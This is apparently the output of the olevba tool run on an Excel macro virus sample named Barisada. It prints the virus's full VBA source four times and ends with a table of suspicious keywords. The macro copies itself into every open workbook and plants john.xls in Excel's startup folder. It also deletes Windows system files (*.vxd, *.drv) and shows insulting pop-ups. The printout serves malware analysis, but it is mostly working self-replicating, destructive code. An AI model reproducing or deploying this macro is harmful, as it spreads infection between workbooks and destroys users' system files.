olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Barisada.w-e236c3925ea681f9cc7a884bd2578a52fe999c8f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Barisada.w-e236c3925ea681f9cc7a884bd2578a52fe999c8f - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
'flag = False
Dim fs, i, stl
Dim str
 myfile = Dir(Application.StartupPath & "\john.xls")
 If myfile <> "john.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\john.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
 
If myfile <> "john.xls" Then Workbooks("john.xls").Close savechanges:=True



Set fs = Application.FileSearch
With fs
    .LookIn = "C:\WINDOWS\SYSTEM\VMM32"
    
    .FileName = "iod.vxd"
    
    If .Execute(SortBy:=msoSortByFileName, _
            SortOrder:=msoSortOrderAscending) > 0 Then
        Kill ("C:\WINDOWS\*.vxd")
        
str = MsgBox("Enter your correct name")
str = InputBox("Attacking on stupid people's computer Please stupid enter your name", "John's Magic")
str = MsgBox("Foolish people are always careless", vbApplicationModal, "Bill Gates")

    Else
       Kill ("C:\*.drv")
        Kill ("C:\windows\*.vxd")
    End If
    End With
 
End Sub
















































-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Barisada.w-e236c3925ea681f9cc7a884bd2578a52fe999c8f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
'flag = False
Dim fs, i, stl
Dim str
 myfile = Dir(Application.StartupPath & "\john.xls")
 If myfile <> "john.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\john.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
 
If myfile <> "john.xls" Then Workbooks("john.xls").Close savechanges:=True



Set fs = Application.FileSearch
With fs
    .LookIn = "C:\WINDOWS\SYSTEM\VMM32"
    
    .FileName = "iod.vxd"
    
    If .Execute(SortBy:=msoSortByFileName, _
            SortOrder:=msoSortOrderAscending) > 0 Then
        Kill ("C:\WINDOWS\*.vxd")
        
str = MsgBox("Enter your correct name")
str = InputBox("Attacking on stupid people's computer Please stupid enter your name", "John's Magic")
str = MsgBox("Foolish people are always careless", vbApplicationModal, "Bill Gates")

    Else
       Kill ("C:\*.drv")
        Kill ("C:\windows\*.vxd")
    End If
    End With
 
End Sub
















































-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Barisada.w-e236c3925ea681f9cc7a884bd2578a52fe999c8f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
'flag = False
Dim fs, i, stl
Dim str
 myfile = Dir(Application.StartupPath & "\john.xls")
 If myfile <> "john.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\john.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
 
If myfile <> "john.xls" Then Workbooks("john.xls").Close savechanges:=True



Set fs = Application.FileSearch
With fs
    .LookIn = "C:\WINDOWS\SYSTEM\VMM32"
    
    .FileName = "iod.vxd"
    
    If .Execute(SortBy:=msoSortByFileName, _
            SortOrder:=msoSortOrderAscending) > 0 Then
        Kill ("C:\WINDOWS\*.vxd")
        
str = MsgBox("Enter your correct name")
str = InputBox("Attacking on stupid people's computer Please stupid enter your name", "John's Magic")
str = MsgBox("Foolish people are always careless", vbApplicationModal, "Bill Gates")

    Else
       Kill ("C:\*.drv")
        Kill ("C:\windows\*.vxd")
    End If
    End With
 
End Sub
















































-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Barisada.w-e236c3925ea681f9cc7a884bd2578a52fe999c8f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
'flag = False
Dim fs, i, stl
Dim str
 myfile = Dir(Application.StartupPath & "\john.xls")
 If myfile <> "john.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\john.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
 
If myfile <> "john.xls" Then Workbooks("john.xls").Close savechanges:=True



Set fs = Application.FileSearch
With fs
    .LookIn = "C:\WINDOWS\SYSTEM\VMM32"
    
    .FileName = "iod.vxd"
    
    If .Execute(SortBy:=msoSortByFileName, _
            SortOrder:=msoSortOrderAscending) > 0 Then
        Kill ("C:\WINDOWS\*.vxd")
        
str = MsgBox("Enter your correct name")
str = InputBox("Attacking on stupid people's computer Please stupid enter your name", "John's Magic")
str = MsgBox("Foolish people are always careless", vbApplicationModal, "Bill Gates")

    Else
       Kill ("C:\*.drv")
        Kill ("C:\windows\*.vxd")
    End If
    End With
 
End Sub
















































-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Kill                |May delete a file                            |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

